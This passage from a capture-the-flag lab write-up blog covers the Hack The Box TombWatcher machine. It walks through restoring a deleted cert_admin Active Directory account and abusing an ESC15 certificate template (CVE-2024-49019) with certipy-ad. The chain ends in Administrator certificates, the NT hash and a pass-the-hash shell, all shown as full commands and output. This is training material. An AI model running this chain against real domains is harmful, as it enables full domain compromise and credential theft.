                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Users
                                          TOMBWATCHER.HTB\Enterprise Admins
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\Domain Users
    [*] Remarks
      ESC2 Target Template              : Template can be targeted as part of ESC2 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
      ESC3 Target Template              : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
```

- but in this looking carefully i found `S-1-5-21-1392491010-1358638721-2126982587-1111` . This SID is not resolved to a human-redable formate , which generally means that the original object has deleted form Active Directory . If this SID belongs to a previously user with vulnerabilities , we can use that for privilege escalation . 

```bash
S-1-5-21-1392491010-1358638721-2126982587-1111
```

- then i got shell as `john` and try to reolve this SID and this belongs to a user `cert_admin` , which is a `Deleted Objects`and this was located in the ADCS OU, which we have control .

```bash
┌──(kali㉿kali)-[~/Desktop/Hackthebox/Labs/TombWatcher]
└─$ evil-winrm -i dc01.tombwatcher.htb -u john -p john@123                        
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\john\Documents> Get-ADObject -Filter 'IsDeleted -eq $true' -IncludeDeletedObjects -Properties *


CanonicalName                   : tombwatcher.htb/Deleted Objects
CN                              : Deleted Objects
Created                         : 11/15/2024 7:01:41 PM
createTimeStamp                 : 11/15/2024 7:01:41 PM
Deleted                         : True
Description                     : Default container for deleted objects
DisplayName                     :
DistinguishedName               : CN=Deleted Objects,DC=tombwatcher,DC=htb
dSCorePropagationData           : {12/31/1600 7:00:00 PM}
instanceType                    : 4
isCriticalSystemObject          : True
isDeleted                       : True
LastKnownParent                 :
Modified                        : 11/15/2024 7:56:00 PM
modifyTimeStamp                 : 11/15/2024 7:56:00 PM
Name                            : Deleted Objects
ObjectCategory                  : CN=Container,CN=Schema,CN=Configuration,DC=tombwatcher,DC=htb
ObjectClass                     : container
ObjectGUID                      : 34509cb3-2b23-417b-8b98-13f0bd953319
ProtectedFromAccidentalDeletion :
sDRightsEffective               : 0
showInAdvancedViewOnly          : True
systemFlags                     : -1946157056
uSNChanged                      : 12851
uSNCreated                      : 5659
whenChanged                     : 11/15/2024 7:56:00 PM
whenCreated                     : 11/15/2024 7:01:41 PM

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
                                  DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
CN                              : cert_admin
                                  DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
codePage                        : 0
countryCode                     : 0
Created                         : 11/15/2024 7:55:59 PM
createTimeStamp                 : 11/15/2024 7:55:59 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb
dSCorePropagationData           : {11/15/2024 7:56:05 PM, 11/15/2024 7:56:02 PM, 12/31/1600 7:00:01 PM}
givenName                       : cert_admin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 11/15/2024 7:57:59 PM
modifyTimeStamp                 : 11/15/2024 7:57:59 PM
msDS-LastKnownRDN               : cert_admin
Name                            : cert_admin
                                  DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1109
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133761921597856970
sAMAccountName                  : cert_admin
sDRightsEffective               : 7
sn                              : cert_admin
userAccountControl              : 66048
uSNChanged                      : 12975
uSNCreated                      : 12844
whenChanged                     : 11/15/2024 7:57:59 PM
whenCreated                     : 11/15/2024 7:55:59 PM

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
                                  DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
CN                              : cert_admin
                                  DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
codePage                        : 0
countryCode                     : 0
Created                         : 11/16/2024 12:04:05 PM
createTimeStamp                 : 11/16/2024 12:04:05 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb
dSCorePropagationData           : {11/16/2024 12:04:18 PM, 11/16/2024 12:04:08 PM, 12/31/1600 7:00:00 PM}
givenName                       : cert_admin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 11/16/2024 12:04:21 PM
modifyTimeStamp                 : 11/16/2024 12:04:21 PM
msDS-LastKnownRDN               : cert_admin
Name                            : cert_admin
                                  DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : c1f1f0fe-df9c-494c-bf05-0679e181b358
objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1110
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133762502455822446
sAMAccountName                  : cert_admin
sDRightsEffective               : 7
sn                              : cert_admin
userAccountControl              : 66048
uSNChanged                      : 13171
uSNCreated                      : 13161
whenChanged                     : 11/16/2024 12:04:21 PM
whenCreated                     : 11/16/2024 12:04:05 PM

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
CN                              : cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
codePage                        : 0
countryCode                     : 0
Created                         : 11/16/2024 12:07:04 PM
createTimeStamp                 : 11/16/2024 12:07:04 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
dSCorePropagationData           : {11/16/2024 12:07:10 PM, 11/16/2024 12:07:08 PM, 12/31/1600 7:00:00 PM}
givenName                       : cert_admin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 11/16/2024 12:07:27 PM
modifyTimeStamp                 : 11/16/2024 12:07:27 PM
msDS-LastKnownRDN               : cert_admin
Name                            : cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1111
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133762504248946345
sAMAccountName                  : cert_admin
sDRightsEffective               : 7
sn                              : cert_admin
userAccountControl              : 66048
uSNChanged                      : 13197
uSNCreated                      : 13186
whenChanged                     : 11/16/2024 12:07:27 PM
whenCreated                     : 11/16/2024 12:07:04 PM



*Evil-WinRM* PS C:\Users\john\Documents> 
```

- now we can restore this user and change its password 


```bash
*Evil-WinRM* PS C:\Users\john\Documents> dir
*Evil-WinRM* PS C:\Users\john\Documents> Restore-ADObject -Identity "CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb"
*Evil-WinRM* PS C:\Users\john\Documents> Set-ADAccountPassword -Identity "cert_admin" -Reset -NewPassword (ConvertTo-SecureString "NothingHere4$" -AsPlainText -Force)
*Evil-WinRM* PS C:\Users\john\Documents> 
```

- then we again run `certipy-ad` to check for vulnerable certificate template

```bash
┌──(kali㉿kali)-[~/Desktop/Hackthebox/Labs/TombWatcher]
└─$ certipy-ad find -vulnerable -u 'cert_admin@tombwatcher.htb' -p 'NothingHere4$' -dc-ip 10.129.232.167

Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20260125111636_Certipy.txt'
[*] Wrote text output to '20260125111636_Certipy.txt'
[*] Saving JSON output to '20260125111636_Certipy.json'
[*] Wrote JSON output to '20260125111636_Certipy.json'
```

- and we found one 

```bash
┌──(kali㉿kali)-[~/Desktop/Hackthebox/Labs/TombWatcher]
└─$ cat 20260125111636_Certipy.txt                                                                      
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
```

- and previously `WebServer`  was not marked as vulnerable template but this time it is marked as vulnerable to `CVE-2024-49019`
- now we will request certificate for user `cert_admin`

## <span style="color: DarkSalmon;"><b># Root</b></span> 
----------

```bash
┌──(kali㉿kali)-[~/Desktop/Hackthebox/Labs/TombWatcher]
└─$ certipy-ad req -u 'cert_admin@tombwatcher.htb' -p 'NothingHere4$' -dc-ip '10.129.232.167' -target 'dc01.tombwatcher.htb' -ca 'tombwatcher-CA-1' -template 'WebServer' -application-policies 'Certificate Request Agent'

Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 4
[*] Successfully requested certificate
[*] Got certificate without identity
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'cert_admin.pfx'
[*] Wrote certificate and private key to 'cert_admin.pfx'
```

- now we will use this certificate to request another certificate on behalf of domain admin.

```bash
┌──(kali㉿kali)-[~/Desktop/Hackthebox/Labs/TombWatcher]
└─$ certipy-ad req -u 'cert_admin@tombwatcher.htb' -p 'NothingHere4$' -dc-ip '10.129.232.167' -target 'dc01.tombwatcher.htb' -ca 'tombwatcher-CA-1' -template 'User' -pfx 'cert_admin.pfx' -on-behalf-of 'TOMBWATCHER\Administrator'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 5
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

- now we will use this template to do authentication that will give us `hash` for the user `Administrator`

```bash
┌──(kali㉿kali)-[~/Desktop/Hackthebox/Labs/TombWatcher]
└─$ certipy-ad auth -pfx 'administrator.pfx' -dc-ip '10.129.232.167'

Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@tombwatcher.htb'
[*]     Security Extension SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Using principal: 'administrator@tombwatcher.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc
```

- then we will use this hash to get shell using `evil-winrm` tool ...

```bash
┌──(kali㉿kali)-[~/Desktop/Hackthebox/Labs/TombWatcher]
└─$ evil-winrm -i dc01.tombwatcher.htb -u Administrator -H f61db423bebe3328d33af26741afe5fc
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        1/25/2026   7:52 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
a***********************
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
```

- and we will collect the `root hash`

<br>
## <span style="color: DarkSalmon;"><b># Final Thoughts</b></span>
--------
I hope this blog continues to be helpful in your learning journey!. If you find this blog helpful, I’d love to hear your thoughts ; my inbox is always open for feedback. Please excuse any typos, and feel free to point them out so I can correct them. Thanks for understanding and happy learning!. You can contact me on Linkedin and Twitter <br>
[linkdin](https://www.linkedin.com/in/hitesh-sharma-413862245/) <br>
[Twitter](https://x.com/Archtrmntor)<br>
<img src="https://tryhackme-badges.s3.amazonaws.com/Archtrmntor.png" alt="Your Image Badge" /><br>

